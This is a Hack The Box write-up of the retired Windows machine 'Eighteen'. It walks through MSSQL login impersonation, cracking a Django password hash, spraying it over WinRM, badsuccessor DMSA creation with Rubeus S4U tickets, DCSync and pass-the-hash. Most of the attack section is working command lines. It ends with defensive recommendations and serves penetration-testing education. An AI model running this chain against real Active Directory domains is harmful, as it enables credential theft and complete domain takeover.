---
title: "MSSQL Impersonation, Shadow Credentials, and DCSync on Windows AD"
description: "A weakly secured MSSQL database yields cracked credentials, then badsuccessor OU delegation and DCSync complete domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - mssql
  - kerberos
  - dcsync
---

## Summary

This Windows Active Directory lab contains an MSSQL service on a domain controller that exposes impersonation and a poorly secured application database. Starting credentials provide database access, where cracking a PBKDF2-SHA256 password hash yields a weak credential reused by a domain user. From that foothold, a loopback LDAP enumeration discovers an exploitable organizational unit, and the badsuccessor technique creates a Domain Member Service Account for Kerberos S4U delegation abuse. DCSync extracts a privileged-account NTLM hash for full control.

## Context and Objective

The target is a Windows Server 2025 domain controller (`<DOMAIN_CONTROLLER>`) in the `<LAB_DOMAIN>` domain. An MSSQL Server 2022 instance, an IIS web server, and WinRM are exposed. The lab provides starting credentials for the `<MSSQL_USER>` account. The objective is to achieve domain administrative access.

**All IP addresses, credentials, hashes, and domain identifiers in this writeup are lab-scoped placeholders.**

## Approach and Evidence

### Enumeration

A TCP port scan reveals HTTP (80), MSSQL (1433), and WinRM (5985) services on the target:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-TCP
```

```text
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The provided `<MSSQL_USER>` credentials are validated against MSSQL:

```bash
nxc mssql <TARGET_IP> -u '<MSSQL_USER>' -p '<MSSQL_CREDENTIALS>' --local-auth
```

```text
MSSQL  <TARGET_IP>  1433  <DOMAIN_CONTROLLER>  [+] <DOMAIN_CONTROLLER>\<MSSQL_USER>:<MSSQL_CREDENTIALS>
```

### MSSQL Impersonation and Database Enumeration

An `impacket-mssqlclient` session with the `<MSSQL_USER>` credentials reveals impersonation privileges over the `<DATABASE_USER>` login:

```bash
impacket-mssqlclient <LAB_DOMAIN>/<MSSQL_USER>:'<MSSQL_CREDENTIALS>'@<TARGET_IP>
```

```text
b'LOGIN'     b''        IMPERSONATE       GRANT        <MSSQL_USER>     <DATABASE_USER>
```

After switching context to `<DATABASE_USER>`, database enumeration discovers `<APPLICATION_DATABASE>`. Querying the `users` table exposes an admin password hash in PBKDF2-SHA256 (Django) format:

```sql
SELECT * FROM USERS;
```

```text
1002   admin   admin   admin@<LAB_DOMAIN>   pbkdf2:sha256:600000$<SALT>$<HASH>
```

### Hash Cracking and Credential Reuse

The hex-encoded hash is converted to hashcat format and cracked with the rockyou wordlist:

```bash
echo '<HEX_HASH>' | xxd -r -p | base64
hashcat admin.hash /wordlists/rockyou.txt -D2 -w3
```

```text
<CRACKED_PASSWORD>
```

Domain users are enumerated via RID brute-forcing through MSSQL, and the cracked password is sprayed across WinRM. The `<DOMAIN_USER>` account accepts the same password:

```bash
nxc winrm <TARGET_IP> -u users.txt -p '<CRACKED_PASSWORD>' --continue-on-succes
```

```text
WINRM  <TARGET_IP>  5985  <DOMAIN_CONTROLLER>  [+] <LAB_DOMAIN>\<DOMAIN_USER>:<CRACKED_PASSWORD> (Pwn3d!)
```

A WinRM session is established as `<DOMAIN_USER>`, confirming initial domain user access on the domain controller.

### Loopback LDAP and Shadow Credentials (badsuccessor)

From the `<DOMAIN_USER>` shell, `netstat` confirms LDAP, Kerberos, and other domain services listening on all interfaces — the host is the domain controller.

The `badsuccessor` NetExec module, executed via proxychains against the loopback LDAP interface, identifies an exploitable organizational unit:

```bash
proxychains nxc ldap <LAB_DOMAIN> -u '<DOMAIN_USER>' -p '<CREDENTIALS>' -M badsuccessor
```

```text
BADSUCCE... <LOOPBACK_IP>  389  <DOMAIN_CONTROLLER>  [+] Found domain controller: <DOMAIN_CONTROLLER>.<LAB_DOMAIN>
BADSUCCE... <LOOPBACK_IP>  389  <DOMAIN_CONTROLLER>  <ORGANIZATIONAL_UNIT> (S-1-5-21-...-1604), OU=<ORGANIZATIONAL_UNIT>,DC=<LAB_DOMAIN>
```

SharpSuccessor creates a Domain Member Service Account (DMSA) in the exploitable OU with delegation rights:

```text
execute-assembly SharpSuccessor.exe -- 'add /path:"OU=<ORGANIZATIONAL_UNIT>,DC=<LAB_DOMAIN>" /account:<DOMAIN_USER> /name:<DMSA_ACCOUNT> /impersonate:<PRIVILEGED_USER>'
```

### S4U Delegation Abuse and DCSync

A Kerberos TGT is obtained for `<DOMAIN_USER>` via Rubeus, then a TGS is requested for the DMSA account using S4U2self/S4U2proxy to impersonate `<PRIVILEGED_USER>`:

```text
execute-assembly Rubeus.exe -- 'asktgt /user:<DOMAIN_USER> /password:<CREDENTIALS> /force /opsec /nowrap /ptt /outfile:<DOMAIN_USER>.kirbi'
execute-assembly Rubeus.exe -- 'asktgs /targetuser:<DMSA_ACCOUNT>$ /service:krbtgt/<LAB_DOMAIN> /opsec /dmsa /nowrap /ptt /ticket:<DOMAIN_USER>.kirbi /outfile:<DMSA_TGS>'
```

With the delegated ticket, DCSync extracts the domain Administrator NTLM hash:

```bash
KRB5CCNAME='<DMSA_ACCOUNT>$.ccache' proxychains -q netexec smb <DOMAIN_CONTROLLER>.<LAB_DOMAIN> --use-kcache --ntds
```

```text
<PRIVILEGED_USER>:500:aad3b...:<PRIVILEGED_USER_NTHASH>:::
```

Pass-the-hash authentication via WinRM grants full domain administrative access:

```bash
proxychains evil-winrm -i <DOMAIN_CONTROLLER>.<LAB_DOMAIN> -u <PRIVILEGED_USER> -H <PRIVILEGED_USER_NTHASH>
```

## Challenges and Decisions

- The MSSQL hash required conversion from Django's PBKDF2 format to hashcat-compatible format (hex to base64 encoding of the hash portion).
- Kerberos time synchronization was needed: the domain controller's current time was retrieved via LDAP and the attacker's system clock was adjusted before ticket operations.
- The `badsuccessor` technique required routing through proxychains to reach the loopback LDAP interface from the compromised host.

## Outcome

The lab was fully compromised. Starting MSSQL credentials provided database access, where an exposed PBKDF2-SHA256 hash was cracked and reused by a domain user. The badsuccessor technique exploited OU delegation misconfiguration to create a DMSA account, enabling S4U delegation abuse. DCSync extracted a privileged-account NTLM hash, achieving complete domain control.

## Lessons and Recommendations

- **MSSQL impersonation and least privilege:** The `<MSSQL_USER>` login's impersonation privilege over `<DATABASE_USER>` was the initial escalation vector. Impersonation grants should be restricted to only necessary service accounts, with regular audit of `IMPERSONATE` permissions.
- **Credential storage and password strength:** The PBKDF2-SHA256 hash with 600,000 iterations was cracked against rockyou. Application passwords should use higher iteration counts (1M+), and passwords must meet complexity and length requirements.
- **Password reuse across services:** The same cracked password worked for `<DOMAIN_USER>` over WinRM. Implement unique password policies and monitor for credential reuse across domain accounts.
- **OU delegation review:** The badsuccessor technique exploited a misconfigured OU allowing DMSA creation with delegation rights. Regular review of OU-level delegation permissions and disabling unnecessary Kerberos delegation prevents this attack path.
- **DCSync monitoring:** A non-privileged domain user should not have replication rights. Restrict `Replication-Getting-Changes` rights and monitor for anomalous DCSync activity across the domain.

## References

- Hack The Box retired Windows machine — [Eighteen](https://app.hackthebox.com/machines/Eighteen)
